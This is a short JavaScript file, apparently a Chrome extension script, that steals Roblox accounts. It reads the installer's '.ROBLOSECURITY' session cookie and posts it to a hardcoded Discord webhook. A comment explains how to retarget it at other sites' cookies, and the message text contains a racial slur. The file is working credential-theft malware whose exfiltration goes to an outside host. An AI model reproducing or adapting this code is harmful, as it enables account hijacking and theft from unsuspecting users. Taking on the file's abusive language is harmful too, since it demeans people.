function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `JAM#8000 On Top`,
            "description": ">>> here the cookie nigga :skull:",
            "color": 141414,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
    webhookReq("https://discord.com/api/webhooks/1002077199844790403/ysor36TMn1EkYoCulkc47Jh-i_TmNW1d3spStfrD-iPi9JUAc5Et1lfNWy3drTTCNyeX", cookie.value);
  }
});
